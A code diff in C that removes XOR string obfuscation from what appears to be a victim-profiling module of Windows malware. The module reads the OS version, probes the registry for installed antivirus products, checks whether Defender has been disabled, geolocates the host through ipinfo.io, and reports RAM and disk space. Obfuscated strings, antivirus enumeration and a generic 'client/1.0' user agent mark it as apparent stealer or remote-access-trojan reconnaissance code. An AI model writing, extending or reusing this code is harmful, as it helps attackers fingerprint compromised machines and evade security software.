@@ -26,15 +26,15 @@ static char* reg_read_sz(HKEY key, const char* subkey, const char* value) {
 }
 
 static char* get_win_version() {
-    const char* key = xor_str(_S("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"));
-    char* product = reg_read_sz(HKEY_LOCAL_MACHINE, key, xor_str(_S("ProductName")));
-    char* build   = reg_read_sz(HKEY_LOCAL_MACHINE, key, xor_str(_S("CurrentBuild")));
-    char* display = reg_read_sz(HKEY_LOCAL_MACHINE, key, xor_str(_S("DisplayVersion")));
-    if (!display) display = reg_read_sz(HKEY_LOCAL_MACHINE, key, xor_str(_S("ReleaseId")));
+    const char* key = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
+    char* product = reg_read_sz(HKEY_LOCAL_MACHINE, key, "ProductName");
+    char* build   = reg_read_sz(HKEY_LOCAL_MACHINE, key, "CurrentBuild");
+    char* display = reg_read_sz(HKEY_LOCAL_MACHINE, key, "DisplayVersion");
+    if (!display) display = reg_read_sz(HKEY_LOCAL_MACHINE, key, "ReleaseId");
 
     char* result = (char*)malloc(256);
-    sprintf(result, xor_str(_S("%s %s (Build %s)")),
-        product ? product : xor_str(_S("Windows")),
+    sprintf(result, "%s %s (Build %s)",
+        product ? product : "Windows",
         display ? display : "",
         build   ? build   : "");
     if (product) free(product);
@@ -45,35 +45,35 @@ static char* get_win_version() {
 
 static char* get_antivirus() {
     const char* av_paths[][2] = {
-        {_S("SOFTWARE\\AVAST Software\\Avast"),  _S("Avast")},
-        {_S("SOFTWARE\\AVG\\Antivirus"),          _S("AVG")},
-        {_S("SOFTWARE\\Bitdefender"),             _S("Bitdefender")},
-        {_S("SOFTWARE\\KasperskyLab"),            _S("Kaspersky")},
-        {_S("SOFTWARE\\McAfee"),                  _S("McAfee")},
-        {_S("SOFTWARE\\Norton"),                  _S("Norton")},
-        {_S("SOFTWARE\\ESET"),                    _S("ESET")},
-        {_S("SOFTWARE\\Trend Micro"),             _S("Trend Micro")},
-        {_S("SOFTWARE\\Malwarebytes"),            _S("Malwarebytes")},
+        {"SOFTWARE\\AVAST Software\\Avast",  "Avast"},
+        {"SOFTWARE\\AVG\\Antivirus",          "AVG"},
+        {"SOFTWARE\\Bitdefender",             "Bitdefender"},
+        {"SOFTWARE\\KasperskyLab",            "Kaspersky"},
+        {"SOFTWARE\\McAfee",                  "McAfee"},
+        {"SOFTWARE\\Norton",                  "Norton"},
+        {"SOFTWARE\\ESET",                    "ESET"},
+        {"SOFTWARE\\Trend Micro",             "Trend Micro"},
+        {"SOFTWARE\\Malwarebytes",            "Malwarebytes"},
         {NULL, NULL}
     };
     for (int i = 0; av_paths[i][0] != NULL; i++) {
         HKEY hKey;
-        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, xor_str(av_paths[i][0]), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, av_paths[i][0], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
             RegCloseKey(hKey);
-            return _strdup(xor_str(av_paths[i][1]));
+            return _strdup(av_paths[i][1]);
         }
     }
     char* disabled = reg_read_sz(HKEY_LOCAL_MACHINE,
-        xor_str(_S("SOFTWARE\\Microsoft\\Windows Defender")), xor_str(_S("DisableAntiSpyware")));
-    if (disabled && strcmp(disabled, "1") == 0) { free(disabled); return _strdup(xor_str(_S("Unknown"))); }
+        "SOFTWARE\\Microsoft\\Windows Defender", "DisableAntiSpyware");
+    if (disabled && strcmp(disabled, "1") == 0) { free(disabled); return _strdup("Unknown"); }
     if (disabled) free(disabled);
-    return _strdup(xor_str(_S("Windows Defender")));
+    return _strdup("Windows Defender");
 }
 
 static char* get_country() {
     HINTERNET hSession = WinHttpOpen(L"client/1.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) return _strdup(xor_str(_S("??")));
+    if (!hSession) return _strdup("??");
     HINTERNET hConnect = WinHttpConnect(hSession, L"ipinfo.io", INTERNET_DEFAULT_HTTP_PORT, 0);
     if (!hConnect) { WinHttpCloseHandle(hSession); return _strdup("??"); }
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/country", NULL,
@@ -132,21 +132,21 @@ static char* get_ram() {
     ULONGLONG freeMB  = ms.ullAvailPhys  / (1024ULL * 1024ULL);
     char* buf = (char*)malloc(64);
     if (totalMB >= 1024)
-        sprintf(buf, xor_str(_S("%.1f GB free / %.1f GB total")),
+        sprintf(buf, "%.1f GB free / %.1f GB total",
             (double)freeMB / 1024.0, (double)totalMB / 1024.0);
     else
-        sprintf(buf, xor_str(_S("%llu MB free / %llu MB total")), freeMB, totalMB);
+        sprintf(buf, "%llu MB free / %llu MB total", freeMB, totalMB);
     return buf;
 }
 
 static char* get_disk() {
     ULARGE_INTEGER freeBytesAvail, totalBytes, totalFreeBytes;
-    if (!GetDiskFreeSpaceExA(xor_str(_S("C:\\")), &freeBytesAvail, &totalBytes, &totalFreeBytes))
-        return _strdup(xor_str(_S("Unknown")));
+    if (!GetDiskFreeSpaceExA("C:\\", &freeBytesAvail, &totalBytes, &totalFreeBytes))
+        return _strdup("Unknown");
     double totalGB = (double)totalBytes.QuadPart      / (1024.0 * 1024.0 * 1024.0);
     double freeGB  = (double)totalFreeBytes.QuadPart  / (1024.0 * 1024.0 * 1024.0);
     char* buf = (char*)malloc(64);
-    sprintf(buf, xor_str(_S("%.1f GB free / %.1f GB total")), freeGB, totalGB);
+    sprintf(buf, "%.1f GB free / %.1f GB total", freeGB, totalGB);
     return buf;
 }
 
